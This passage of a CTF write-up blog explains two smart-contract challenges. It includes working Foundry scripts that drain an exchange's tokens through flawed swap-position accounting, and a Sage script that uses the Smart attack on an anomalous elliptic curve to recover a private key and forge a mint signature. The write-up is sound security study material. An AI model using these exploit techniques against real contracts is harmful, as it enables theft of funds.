Token2 :  0x601C3EA942c5Eae7301C39c95342307a17cEc0B7
Token3 :  0xd5e4b9f37E1b51D18CD2f281B85DCDC07b4540a1
isSolved() :  false
Exchange balance Token1 :  200000
Exchange balance Token2 :  200000
Exchange balance Token3 :  400000
Player balance Token1 :  0
Player balance Token2 :  0
Player balance Token3 :  0
```

Okay, Goal is to drain all tokens from the exchange. Lets do this. 

We need to find the function where the token amount is being sent to us. It is the `withdraw()` function.

```solidity
function withdraw(address token, uint256 amount) public duringSwap {
    require(allowedTokens[token], "token not allowed");

    Token(token).transfer(msg.sender, amount);
    updatePosition(token, -int256(amount));
}
```

The withdraw function is optimistically sending the amount we are requesting directly to the caller and then updating the position, but first of all the swap should begin (`duringSwap`). For this we can call `swap()` functions to start the swap. 

```solidity
function swap() external {
    SwapState storage swapState = getSwapState();

    require(!swapState.hasBegun, "swap already in progress");
    swapState.hasBegun = true;

    SwapCallback(msg.sender).doSwap();

    require(swapState.unsettledTokens == 0, "not settled");
    nonce += 1;
}
```

If we call the `swap()` function it will callback the `doSwap()` function on the caller. So, Now we can call the `withdraw()` function inside the callback of `doSwap()`. 

Let's see what happens if we withdraw all the `200000` tokens of `Token1`. The withdraw function will send all the `200000` token1 to us but it updates our position.

```solidity
withdraw( token1, 200000 ) {
    Token(token).transfer(msg.sender, 200000);
    updatePosition(token1, -int256(200000));
}

function updatePosition(address token, int256 amount) internal {
    require(allowedTokens[token], "token not allowed");

    SwapState storage swapState = getSwapState();

    int256 currentPosition = swapState.positions[token];
    int256 newPosition = currentPosition + amount;

    if (newPosition == 0) swapState.unsettledTokens -= 1;
    else if (currentPosition == 0) swapState.unsettledTokens += 1;

    swapState.positions[token] = newPosition;
}
```

Now our newPosition becomes `200000` and the `swapState.unsettledTokens = 1` will be updated. So, we need to settle these `unsettledTokens` before completing this swap. If we observe the `swapTokens()` function where we can do swap and the positions are also being updated there.

```solidity
function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
    require(allowedTokens[tokenIn], "token not allowed");
    require(allowedTokens[tokenOut], "token not allowed");

    uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);

    require(liquidityBefore > 0, "no liquidity");

    uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
    uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;

    setReserves(tokenIn, tokenOut, newReservesIn);
    setReserves(tokenOut, tokenIn, newReservesOut);

    uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);

    updatePosition(tokenIn, -int256(amountIn));
    updatePosition(tokenOut, int256(amountOut));

    require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
}
```
The `amountIn` to the `swapTokens()` will be deducted from the current position.

```solidity
    updatePosition(tokenIn, -int256(amountIn));
    updatePosition(tokenOut, int256(amountOut));
```

So lets do these steps, 

```solidity
Attack1.doSwap() {
    exchange.withdraw(address(token1), 200000);
    // 200000 token1 drained
    // updatePosition() in withdraw:
    // - currentPosition = 0
    // - newPosition = 0 - 200000 = -200000
    // - swapState.unsettledTokens = 1
    // - swapState.positions[token1] = -200000
    exchange.swapTokens(address(token1), address(token2), 200000, 0);
    // updatePosition() for token1 in swapTokens:
    // - currentPosition = -200000
    // - newPosition =  -200000 + (-200000)= -400000
    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
    // - swapState.positions[token1] = -400000

    // updatePosition() for token2 in swapTokens:
    // - currentPosition = 0
    // - newPosition =  0 + 0 = 0
    // - swapState.unsettledTokens = 0 (newPosition==0)
    // - swapState.positions[token2] = 0 (because amountOut = 0)
    // @notice: Here we can observe some inconsistency between state postions and unsettled tokens.

    exchange.withdraw(address(token2), 200000);
    // 200000 token2 drained
    // updatePosition() in withdraw:
    // - currentPosition = 0
    // - newPosition = 0 - 200000 = -200000
    // - swapState.unsettledTokens = 1 (currentPosition==0)
    // - swapState.positions[token2] = -200000

    exchange.swapTokens(address(token2), address(token3), 200000, 0);
    // updatePosition() for token2 in swapTokens:
    // - currentPosition = -200000
    // - newPosition =  -200000 + (-200000)= -400000
    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
    // - swapState.positions[token2] = -400000

    // updatePosition() for token3 in swapTokens:
    // - currentPosition = 0
    // - newPosition =  0 + 0 = 0
    // - swapState.unsettledTokens = 0 (newPosition==0)
    // - swapState.positions[token3] = 0 (because amountOut = 0)
}

Attack2.doSwap(){
    exchange.withdraw(address(token3), 400000);
    // 400000 token3 drained
    // updatePosition() in withdraw:
    // - currentPosition = 0
    // - newPosition = 0 - 400000 = -400000
    // - swapState.unsettledTokens = 1 (currentPosition==0)
    // - swapState.positions[token3] = -400000

    exchange.swapTokens(address(token3), address(token1), 400000, 0);
    // updatePosition() for token3 in swapTokens:
    // - currentPosition = -400000
    // - newPosition =  -400000 + (-400000)= -800000
    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
    // - swapState.positions[token3] = -800000

    // updatePosition() for token1 in swapTokens:
    // - currentPosition = 0
    // - newPosition =  0 + 0 = 0
    // - swapState.unsettledTokens = 0 (newPosition==0)
    // - swapState.positions[token1] = 0 (because amountOut = 0)
}
```

Don't ask me anything please follow the math explained above. Th issues I see here are, 

- Allowing withdraw() during swap
- nonce being updated after the swap
- Inconsistency between `swapState.positions` and `swapState.unsettledTokens`. 
- Only handling the cases where the `currentPosition == 0 || newPosition == 0`. 


{% note(clickable=true, header="Exchange.s.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Exchange.sol";

contract ExchangeSolve is Script {
    Setup public set = Setup(0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B);
    Exchange public exchange = set.exchange();
    Token public token1 = set.token1();
    Token public token2 = set.token2();
    Token public token3 = set.token3();
    address player = vm.envAddress("PLAYER");

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Player : ", player);
        console.log("Setup : ", address(set));
        console.log("Exchange : ", address(exchange));
        console.log("Token1 : ", address(token1));
        console.log("Token2 : ", address(token2));
        console.log("Token3 : ", address(token3));

        console.log("isSolved() : ", set.isSolved());

        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
        console.log("Player balance Token1 : ", token1.balanceOf(player));
        console.log("Player balance Token2 : ", token2.balanceOf(player));
        console.log("Player balance Token3 : ", token3.balanceOf(player));

        Attack attack = new Attack(address(set));
        attack.exploit();
        Attack2 attack2 = new Attack2(address(set));
        attack2.exploit();

        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
        console.log("Attacker balance Token1 : ", token1.balanceOf(address(attack)));
        console.log("Attacker balance Token2 : ", token2.balanceOf(address(attack)));
        console.log("Attacker 2 balance Token3 : ", token3.balanceOf(address(attack2)));
        console.log("isSolved() : ", set.isSolved());
    }

}

contract Attack is SwapCallback{
    Setup public set;
    Exchange public exchange;
    Token public token1;
    Token public token2;
    Token public token3;
    constructor(address _setup) {
        set = Setup(_setup);
        exchange = set.exchange();
        token1 = set.token1();
        token2 = set.token2();
        token3 = set.token3();
    }
    function exploit() public {
        exchange.swap();
    }
    function doSwap() public {

        exchange.withdraw(address(token1), 200000);
        exchange.swapTokens(address(token1), address(token2), 200000, 0);

        exchange.withdraw(address(token2), 200000);
        exchange.swapTokens(address(token2), address(token3), 200000, 0);
    }
}

contract Attack2 is SwapCallback{
    Setup public set;
    Exchange public exchange;
    Token public token1;
    Token public token2;
    Token public token3;
    constructor(address _setup) {
        set = Setup(_setup);
        exchange = set.exchange();
        token1 = set.token1();
        token2 = set.token2();
        token3 = set.token3();
    }
    function exploit() public {
        exchange.swap();
    }
    function doSwap() public {
        exchange.withdraw(address(token3), 400000);
        exchange.swapTokens(address(token3), address(token1), 400000, 0);
    }
}
```
{%end%}
***


# Fallout

P: "In the aftermath of the Great War, the world lies shattered, but hope endures in the form of Nuka-Cola Caps, the currency of the wasteland. Your mission, should you choose to accept it, is to obtain 1,000,000 Nuka-Cola Caps and secure your place as a true survivor in the barren expanse of post-apocalyptic America."

{% note(clickable=true, header="Fallout.sol") %}
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";

contract Fallout is ERC20 {
    error WrongPlayer();
    error InvalidSignature();

    uint256 public immutable Qx;
    uint256 public immutable Qy;
    address public immutable player;
    Vault public immutable vault;

    constructor(address _player, Vault _vault, uint256 qx, uint256 qy) ERC20("Nuka-Cola", "CAPS") {
        Qx = qx;
        Qy = qy;
        player = _player;
        vault = _vault;
    }

    function mint(
        address recipient,
        uint256 value,
        uint256[2] memory rs
    ) public {
        bytes32 hash = keccak256(abi.encode(recipient, value));

        uint256[2] memory Q;
        Q[0] = Qx;
        Q[1] = Qy;

        bool valid = vault.validateSignature(hash, rs, Q);
        if (!valid) {
            revert InvalidSignature();
        }

        _mint(recipient, value);
    }

    function isSolved() public view returns (bool) {
        return balanceOf(player) >= 1_000_000 ether;
    }
}

contract Vault {
    // Set parameters for curve.
    uint256 public immutable a;
    uint256 public immutable b;
    uint256 public immutable gx;
    uint256 public immutable gy;
    uint256 public immutable p;

    constructor(uint256 _a, uint256 _b, uint256 _gx, uint256 _gy, uint256 _p) {
        a = _a;
        b = _b;
        gx = _gx;
        gy = _gy;
        p = _p;
    }

    /**
     * @dev Inverse of u in the field of modulo m.
     */

    function inverseMod(uint u, uint m) internal view
        returns (uint)
    {
        if (u == 0 || u == m || m == 0)
            return 0;
        if (u > m)
            u = u % m;

        int t1;
        int t2 = 1;
        uint r1 = m;
        uint r2 = u;
        uint q;

        while (r2 != 0) {
            q = r1 / r2;
            (t1, t2, r1, r2) = (t2, t1 - int(q) * t2, r2, r1 - q * r2);
        }

        if (t1 < 0)
            return (m - uint(-t1));

        return uint(t1);
    }

    /**
     * @dev Transform affine coordinates into projective coordinates.
     */
    function toProjectivePoint(uint x0, uint y0) public view
        returns (uint[3] memory P)
    {
        P[2] = addmod(0, 1, p);
        P[0] = mulmod(x0, P[2], p);
        P[1] = mulmod(y0, P[2], p);
    }

    /**
     * @dev Add two points in affine coordinates and return projective point.
     */
    function addAndReturnProjectivePoint(uint x1, uint y1, uint x2, uint y2) public view
        returns (uint[3] memory P)
    {
        uint x;
        uint y;
        (x, y) = add(x1, y1, x2, y2);
        P = toProjectivePoint(x, y);
    }

    /**
     * @dev Transform from projective to affine coordinates.
     */
    function toAffinePoint(uint x0, uint y0, uint z0) public view
        returns (uint x1, uint y1)
    {
        uint z0Inv;
        z0Inv = inverseMod(z0, p);
        x1 = mulmod(x0, z0Inv, p);
        y1 = mulmod(y0, z0Inv, p);
    }

    /**
     * @dev Return the zero curve in projective coordinates.
     */
    function zeroProj() public view
        returns (uint x, uint y, uint z)
    {
        return (0, 1, 0);
    }

    /**
     * @dev Return the zero curve in affine coordinates.
     */
    function zeroAffine() public view
        returns (uint x, uint y)
    {
        return (0, 0);
    }

    /**
     * @dev Check if the curve is the zero curve.
     */
    function isZeroCurve(uint x0, uint y0) public view
        returns (bool isZero)
    {
        if(x0 == 0 && y0 == 0) {
            return true;
        }
        return false;
    }

    /**
     * @dev Check if a point in affine coordinates is on the curve.
     */
    function isOnCurve(uint x, uint y) public view
        returns (bool)
    {
        if (0 == x || x == p || 0 == y || y == p) {
            return false;
        }

        uint LHS = mulmod(y, y, p); // y^2
        uint RHS = mulmod(mulmod(x, x, p), x, p); // x^3

        if (a != 0) {
            RHS = addmod(RHS, mulmod(x, a, p), p); // x^3 + a*x
        }
        if (b != 0) {
            RHS = addmod(RHS, b, p); // x^3 + a*x + b
        }

        return LHS == RHS;
    }

    /**
     * @dev Double an elliptic curve point in projective coordinates. See
     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
     */
    function twiceProj(uint x0, uint y0, uint z0) public view
        returns (uint x1, uint y1, uint z1)
    {
        uint t;
        uint u;
        uint v;
        uint w;

        if(isZeroCurve(x0, y0)) {
            return zeroProj();
        }

        u = mulmod(y0, z0, p);
        u = mulmod(u, 2, p);

        v = mulmod(u, x0, p);
        v = mulmod(v, y0, p);
        v = mulmod(v, 2, p);

        x0 = mulmod(x0, x0, p);
        t = mulmod(x0, 3, p);

        z0 = mulmod(z0, z0, p);
        z0 = mulmod(z0, a, p);
        t = addmod(t, z0, p);

        w = mulmod(t, t, p);
        x0 = mulmod(2, v, p);
        w = addmod(w, p-x0, p);

        x0 = addmod(v, p-w, p);
        x0 = mulmod(t, x0, p);
        y0 = mulmod(y0, u, p);
        y0 = mulmod(y0, y0, p);
        y0 = mulmod(2, y0, p);
        y1 = addmod(x0, p-y0, p);

        x1 = mulmod(u, w, p);

        z1 = mulmod(u, u, p);
        z1 = mulmod(z1, u, p);
    }

    /**
     * @dev Add two elliptic curve points in projective coordinates. See
     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
     */
    function addProj(uint x0, uint y0, uint z0, uint x1, uint y1, uint z1) public view
        returns (uint x2, uint y2, uint z2)
    {
        uint t0;
        uint t1;
        uint u0;
        uint u1;

        if (isZeroCurve(x0, y0)) {
            return (x1, y1, z1);
        }
        else if (isZeroCurve(x1, y1)) {
            return (x0, y0, z0);
        }

        t0 = mulmod(y0, z1, p);
        t1 = mulmod(y1, z0, p);

        u0 = mulmod(x0, z1, p);
        u1 = mulmod(x1, z0, p);

        if (u0 == u1) {
            if (t0 == t1) {
                return twiceProj(x0, y0, z0);
            }
            else {
                return zeroProj();
            }
        }

        (x2, y2, z2) = addProj2(mulmod(z0, z1, p), u0, u1, t1, t0);
    }

    /**
     * @dev Helper function that splits addProj to avoid too many local variables.
     */
    function addProj2(uint v, uint u0, uint u1, uint t1, uint t0) private view
        returns (uint x2, uint y2, uint z2)
    {
        uint u;
        uint u2;
        uint u3;
        uint w;
        uint t;

        t = addmod(t0, p-t1, p);
        u = addmod(u0, p-u1, p);
        u2 = mulmod(u, u, p);

        w = mulmod(t, t, p);
        w = mulmod(w, v, p);
        u1 = addmod(u1, u0, p);
        u1 = mulmod(u1, u2, p);
        w = addmod(w, p-u1, p);

        x2 = mulmod(u, w, p);

        u3 = mulmod(u2, u, p);
        u0 = mulmod(u0, u2, p);
        u0 = addmod(u0, p-w, p);
        t = mulmod(t, u0, p);
        t0 = mulmod(t0, u3, p);

        y2 = addmod(t, p-t0, p);

        z2 = mulmod(u3, v, p);
    }

    /**
     * @dev Add two elliptic curve points in affine coordinates.
     */
    function add(uint x0, uint y0, uint x1, uint y1) public view
        returns (uint, uint)
    {
        uint z0;

        (x0, y0, z0) = addProj(x0, y0, 1, x1, y1, 1);

        return toAffinePoint(x0, y0, z0);
    }

    /**
     * @dev Double an elliptic curve point in affine coordinates.
     */
    function twice(uint x0, uint y0) public view
        returns (uint, uint)
    {
        uint z0;

        (x0, y0, z0) = twiceProj(x0, y0, 1);

        return toAffinePoint(x0, y0, z0);
    }

    /**
     * @dev Multiply an elliptic curve point by a 2 power base (i.e., (2^exp)*P)).
     */
    function multiplyPowerBase2(uint x0, uint y0, uint exp) public view
        returns (uint, uint)
    {
        uint base2X = x0;
        uint base2Y = y0;
        uint base2Z = 1;

        for(uint i = 0; i < exp; i++) {
            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
        }

        return toAffinePoint(base2X, base2Y, base2Z);
    }

    /**
     * @dev Multiply an elliptic curve point by a scalar.
     */
    function multiplyScalar(uint x0, uint y0, uint scalar) public view
        returns (uint x1, uint y1)
    {
        if(scalar == 0) {
            return zeroAffine();
        }
        else if (scalar == 1) {
            return (x0, y0);
        }
        else if (scalar == 2) {
            return twice(x0, y0);
        }

        uint base2X = x0;
        uint base2Y = y0;
        uint base2Z = 1;
        uint z1 = 1;
        x1 = x0;
        y1 = y0;

        if(scalar%2 == 0) {
            x1 = y1 = 0;
        }

        scalar = scalar >> 1;

        while(scalar > 0) {
            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);

            if(scalar%2 == 1) {
                (x1, y1, z1) = addProj(base2X, base2Y, base2Z, x1, y1, z1);
            }

            scalar = scalar >> 1;
        }

        return toAffinePoint(x1, y1, z1);
    }

    /**
     * @dev Multiply the curve's generator point by a scalar.
     */
    function multipleGeneratorByScalar(uint scalar) public view
        returns (uint, uint)
    {
        return multiplyScalar(gx, gy, scalar);
    }

    /**
     * @dev Validate combination of message, signature, and public key.
     */
    function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
        returns (bool)
    {
        // To disambiguate between public key solutions, include comment below.
        if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
            return false;
        }
        if (!isOnCurve(Q[0], Q[1])) {
            return false;
        }

        uint x1;
        uint x2;
        uint y1;
        uint y2;

        uint sInv = inverseMod(rs[1], p);
        (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
        (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
        uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);

        if (P[2] == 0) {
            return false;
        }

        uint Px = inverseMod(P[2], p);
        Px = mulmod(P[0], mulmod(Px, Px, p), p);

        return Px % p == rs[0];
    }
}

```
{%end%}

## Solution

Aaah.. Mathematics, Cryptography and Smart contracts and elite combination here. The goal is very clear here we need to call the `mint()` function with the amount `1_000_000 ether`. 
The challenge for us is to pass the signature verification. 

So, what the heck is the math is doing in the solidity smart contract? Well it is an **Elliptic Curve** Cryptography scheme implementation. To be precisely it is a **SECP256R1** curve. 

Now, first learn a bit about the **ECC** and how an implementation looks.

### Elliptic Curve Cryptography

Elliptic Curve Cryptography (ECC) is an asymmetric cryptographic that provides the same level of security as RSA or discrete logarithm systems
with considerably shorter operands (approximately 160–256 bit vs. 1024–3072 bit). An elliptic curve is a special type of polynomial equation. For cryptographic use, we need to consider the curve not over the real numbers but over a finite field. 

This is how an ECC equations looks like, 

<center> 

\\( E:Y^2 = X^3+aX+b \\) 

<img src="/assets/img/ctf_img/statemind25/statemind_fallout1.png" height = 50% width = 50%>

</center>

There is point P, 2P and a straight line marked on the graph. These are the operations we can perform on Elliptic Curves. Addition of two points (P, Q) will result point R. IF we double the same point (P+P) will result in a 2P. If I did this point addition for `n` times, i.e, \\( Q = n*P \\). Now I'll give you the values of `Q,P` can you find what is `n`? This is where the ECC security lies. 

Let's see how a secure signing and verification process looks like, 

### ECDSA Signing Process

A user selects a private key \\( d \\) where \\( 1 \leq d < n \\) and computes the public key: \\( Q = d \cdot G \\)

1. Compute the message hash \\( z \\) (typically \\( z = H(m) \\), using SHA-256).
2. Select a random integer \\( k \\) where \\( 1 \leq k < n \\).
3. Compute the elliptic curve point:

   \\[ (x_1, y_1) = k \cdot G \\]

4. Compute the first signature component:

   \\[ r = x_1 \mod n \\]

   If \\( r = 0 \\), choose a new \\( k \\) and repeat.

5. Compute the second signature component:
   
   \\[ s = k^{-1} (z + r d) \mod n \\]

   If \\( s = 0 \\), choose a new \\( k \\) and repeat.

6. The signature is \\( (r, s) \\).

### ECDSA Verification Process

Given a signature \\( (r, s) \\) and public key \\( Q \\):

1. Compute the message hash \\( z = H(m) \\).
2. Compute the modular inverse of \\( s \\) modulo \\( n \\):
   
   \\[ s^{-1} \mod n \\]

3. Compute:

   \\[ u_1 = z s^{-1} \mod n \\]

   \\[ u_2 = r s^{-1} \mod n \\]

4. Compute the elliptic curve point:

   \\[ (x', y') = u_1 G + u_2 Q \\]

5. Compute \\( x' \mod n \\) and check:

   \\[ x' \equiv r \mod n \\]

   If true, the signature is valid.


### Attack

Lets get all the values and point details from the protocol.

```bash
Fallout :  0xf96C8C1685180b9551f86952992baAA220E7C91C
Vault :  0x11e44e424A85203E1208097128B9B1e897C8A9A9
Qx =  228372021298333142209829245091882548944496316312635232236
Qy =  3693481507636668030082911526987394375826206080991036294396
a =  479674765111403080798288599752794621357071126054239970719
b =  1839890679886286542886449861618094502587090720247817035647
gx =  741691539696267564005241324344676638704819822626281227364
gy =  3102360199939373249439960210926161310269296148717758328237
p =  4007911249843509079694969957202343357280666055654537667969
```

Enough equtions, now compare the current solidity implementation of the verification process with the above equations. 

```solidity
function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
    returns (bool)
{
    // To disambiguate between public key solutions, include comment below.
    if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
        return false;
    }
    if (!isOnCurve(Q[0], Q[1])) {
        return false;
    }
    uint x1;
    uint x2;
    uint y1;
    uint y2;
    uint sInv = inverseMod(rs[1], p);
    (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
    (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
    uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
    if (P[2] == 0) {
        return false;
    }
    uint Px = inverseMod(P[2], p);
    Px = mulmod(P[0], mulmod(Px, Px, p), p);
    return Px % p == rs[0];
}
```

The `sInv` is computed using `mod n`. `u1(x1, y1)` and `u2(x1, y1)` are also computed over `mod n` and suprisingly we didn't got `n` value from the protocol. So, something is fishy...

`n` is the order of the curve. We can compute this by doing the following.

\\[ Ep = EllipticCurve(GF(p), [a,b]) \\]

\\[ n = Ep.order()\\]

\\[ n = 4007911249843509079694969957202343357280666055654537667969\\]

Interesting, \\[ p == n \\]

These kind of ECC curves are called as **Anomalous Curves**. It is easy to solve the ECDLP in linear time when the underlying elliptic curve is anomalous, i.e. when the number of rational points on `Fp` is equal to the prime number `p`. There was a research paper named [Generating Anomalous Elliptic Curves](https://www.monnerat.info/publications/anomalous.pdf) published on how to do this. This paper explained an attack called **Smart** to solve ECDLP of Anomalous Curves. 

So, now with the **Smart** attack we can compute the Private key from the given values. So, once the we compute the Private Key we need to generate the `message` which we are going to sign and pass to the `mint` function.

`bytes32 message = keccak256(abi.encode(player, 1_000_000 ether));`

Now we need to sign the above message with the computed private key and pass the signature to `mint()` function. That's all. 

Python script to perform **Smart Attack**

{% note(clickable=true, header="fall.py") %}

```python
# https://mslc.ctf.su/wp/polictf-2012-crypto-500/
# https://ctftime.org/writeup/29700
# https://giacomopope.com/hsctf-2019/#spooky-ecc

p = 4007911249843509079694969957202343357280666055654537667969
q = 2*p + 1
a = 479674765111403080798288599752794621357071126054239970719 
b = 1839890679886286542886449861618094502587090720247817035647

Ep = EllipticCurve(GF(p), [a,b])
G = Ep(741691539696267564005241324344676638704819822626281227364,3102360199939373249439960210926161310269296148717758328237)
Q = Ep(228372021298333142209829245091882548944496316312635232236,3693481507636668030082911526987394375826206080991036294396)

n = Ep.order()
Fn = FiniteField(n)

m = 19666107331951626476415026567086342074650612991336538073686539593437448590271

def SmartAttack(P,Q,p):
    E = P.curve()
    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])

    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)
    for P_Qp in P_Qps:
        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:
            break

    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)
    for Q_Qp in Q_Qps:
        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:
            break

    p_times_P = p*P_Qp
    p_times_Q = p*Q_Qp

    x_P,y_P = p_times_P.xy()
    x_Q,y_Q = p_times_Q.xy()

    phi_P = -(x_P/y_P)
    phi_Q = -(x_Q/y_Q)
    k = phi_Q/phi_P
    return ZZ(k)

def ecdsa_sign(d, m):
  r = 0
  s = 0
  while s == 0:
    k = 1
    while r == 0:
      k = randint(1, n - 1)
      Q = k * G
      (x1, y1) = Q.xy()
      r = Fn(x1)
    e = m
    s = Fn(k) ^ (-1) * (e + d * r)
  return [r, s]

def ecdsa_verify(Q, m, r, s):
  e = m
  w = s ^ (-1)
  u1 = (e * w)
  u2 = (r * w)
  P1 = Integer(u1) * G
  P2 = Integer(u2) * Q
  X = P1 + P2
  (x, y) = X.xy()
  v = Fn(x)
  return v == r

d = SmartAttack(G,Q,p)

[r, s] = ecdsa_sign(d, m)
result = ecdsa_verify(Q, m, r, s)

print (f"Message: {m}")
print (f"Public Key: {Q.xy()}")
print (f"Private Key: {d}")

print ("=== Signature ===")
print (f" r = {r}")
print (f" s = {s}")
print (f"Verification: {result}")

# Message: 19666107331951626476415026567086342074650612991336538073686539593437448590271
# Public Key: (228372021298333142209829245091882548944496316312635232236, 3693481507636668030082911526987394375826206080991036294396)
# Private Key: 2590225047465443722024386469461634294729219346156883417670
# === Signature ===
#  r = 2195097151127120065579326181785367043581509779126357541128
#  s = 928540552076520879873320608471470817377985074596666122262
# Verification: True
```
{%end%}

Solidity script to call `mint()`.

{% note(clickable=true, header="Fallout.s.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Fallout.sol";

contract FalloutSolve is Script {
    Fallout public fallout = Fallout(0xf96C8C1685180b9551f86952992baAA220E7C91C);
    Vault public vault = fallout.vault();
    address player = vm.envAddress("PLAYER");
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Fallout : ", address(fallout));
        console.log("Vault : ", address(vault));
        uint256 qx = fallout.Qx();
        uint256 qy = fallout.Qy();
        uint256  a = vault.a();
        uint256  b = vault.b();
        uint256  gx = vault.gx();
        uint256  gy = vault.gy();
        uint256  p = vault.p();
        uint256 n = 4007911249843509079694969957202343357280666055654537667969; // n = Ep.order()
        console.log("Qx = ", qx);
        console.log("Qy = ", qy);
        console.log("a = ", a);
        console.log("b = ", b);
        console.log("gx = ", gx);
        console.log("gy = ", gy);
        console.log("p = ", p);
        console.log("n = ", n);
        console.log("isSolved() : ", fallout.isSolved());
        bytes32 hash = keccak256(abi.encode(player, 1_000_000 ether));
        console.logBytes32(hash);
        uint256[2] memory rs = [uint256(2195097151127120065579326181785367043581509779126357541128), 928540552076520879873320608471470817377985074596666122262];
        fallout.mint(player, 1_000_000 ether, rs);
        console.log("isSolved() : ", fallout.isSolved());   
    }
}
```
{%end%}
***

# Chef

I learned Huff programming just to solve this challenge. This challenge deserves a dedicated blog, read it here : [Learn Huff by solving a CTF challenge](https://themj0ln1r.github.io/posts/learn-huff-with-ctf)


***

Kudos to you for sticking with me till the end and hope you've learned something from this. 

## References 
1. [Anti Proxy Patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)
2. [Oracle Manipulation](https://www.cyfrin.io/blog/price-oracle-manipulation-attacks-with-examples)
3. [Uniswap V3 Concentrated Liquidity](https://mixbytes.io/blog/uniswap-v3-ticks-dive-into-concentrated-liquidity)
4. [Oracles](https://rdi.berkeley.edu/berkeley-defi/assets/material/COMPRESSED%20Oracle%20Lecture—DeFi%20course.pdf)
5. [Stable Coins](https://rdi.berkeley.edu/berkeley-defi/assets/material/Lecture%207%20Introduction%20Slides.pdf)
6. [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity)
7. [Elliptic Curve For Developers](https://cryptobook.nakov.com/asymmetric-key-ciphers/elliptic-curve-cryptography-ecc)
8. [ECDSA Handle with care](https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/)
9. [Generating Anomalous Elliptic Curves](https://www.monnerat.info/publications/anomalous.pdf)
